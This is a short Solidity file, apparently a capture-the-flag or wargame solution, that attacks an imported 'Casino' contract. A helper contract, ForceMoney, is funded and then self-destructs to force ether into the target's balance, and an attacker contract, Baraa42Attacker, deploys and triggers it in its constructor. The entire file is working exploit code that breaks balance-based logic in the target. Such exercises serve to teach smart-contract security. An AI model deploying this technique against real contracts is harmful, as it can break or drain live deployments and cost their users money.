pragma solidity 0.8.0;

import "./Casino.sol";

contract ForceMoney {
    address target;

    constructor(address t) payable {
        require(msg.value > 0);
        target = t;
    }

    function die() public {
        selfdestruct(payable(target));
    }
}

contract Baraa42Attacker {
    
    constructor(Casino instance) payable {
        require(msg.value > 0);
        ForceMoney f = new ForceMoney{value: msg.value}(address(instance));
        f.die();
    }

    receive() external payable { }

}